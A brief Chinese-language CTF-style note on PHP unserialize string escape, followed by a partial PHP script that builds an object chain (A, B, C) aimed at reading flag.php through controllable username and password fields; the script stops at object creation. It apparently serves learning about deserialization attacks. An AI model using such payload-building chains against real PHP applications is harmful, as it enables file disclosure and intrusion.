看见替换想到字符串逃逸

因为A类中的username，password可控。

```php
<?php
class A{
    public $username;
    public $password;
    function __construct(){
        $this->password = new B();
        $this->username ='\0';
    }
}

class B{
    public $b;
    function __construct(){
        $this->b=new C;
    }
}

class C{
    public $c;
    function __construct(){
        $this->c="flag.php";
    }
}

$a=new A();
